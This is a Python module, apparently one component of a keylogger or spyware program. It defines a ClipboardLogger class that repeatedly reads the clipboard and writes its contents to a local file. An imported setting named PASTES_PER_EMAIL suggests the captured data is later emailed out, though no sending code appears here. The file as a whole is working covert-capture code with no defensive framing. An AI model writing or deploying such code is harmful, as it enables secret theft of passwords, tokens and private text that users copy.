import pyperclip
import time

from utils.logging_utils import log_data, log_error
from config.config import CLIPBOARD_LOG_INTERVAL, PASTES_PER_EMAIL


class ClipboardLogger:
    def __init__(self):
        self.log_file = "clipboard.txt"
        self.interval = CLIPBOARD_LOG_INTERVAL
        self.running = True

    def log_clipboard(self):
        data = pyperclip.paste().replace("\n", r"\n")
        log_data(self.log_file, data)

    def run(self):
        try:
            while self.running:
                self.log_clipboard()
                time.sleep(self.interval)
        except Exception as e:
            self.running = False
            log_error(e)
